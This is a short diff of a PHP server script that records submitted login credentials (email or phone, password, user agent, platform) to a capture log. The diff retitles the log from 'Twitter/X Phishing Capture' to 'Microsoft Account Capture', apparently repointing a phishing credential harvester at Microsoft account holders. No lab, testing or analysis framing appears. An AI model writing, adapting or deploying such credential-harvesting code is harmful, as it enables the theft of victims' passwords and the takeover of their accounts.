@@ -7,10 +7,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     
     if ($credentials) {
         $timestamp = date('Y-m-d H:i:s');
-        $log = "=== Twitter/X Phishing Capture ===\n";
+        $log = "=== Microsoft Account Capture ===\n";
         $log .= "Timestamp: $timestamp\n";
         $log .= "Type: " . ($credentials['type'] ?? 'unknown') . "\n";
-        $log .= "Email/Phone/Username: " . ($credentials['email'] ?? 'N/A') . "\n";
+        $log .= "Email/Phone/Skype: " . ($credentials['email'] ?? 'N/A') . "\n";
         $log .= "Password: " . ($credentials['password'] ?? 'N/A') . "\n";
         $log .= "User Agent: " . ($credentials['userAgent'] ?? 'N/A') . "\n";
         $log .= "Platform: " . ($credentials['platform'] ?? 'N/A') . "\n";
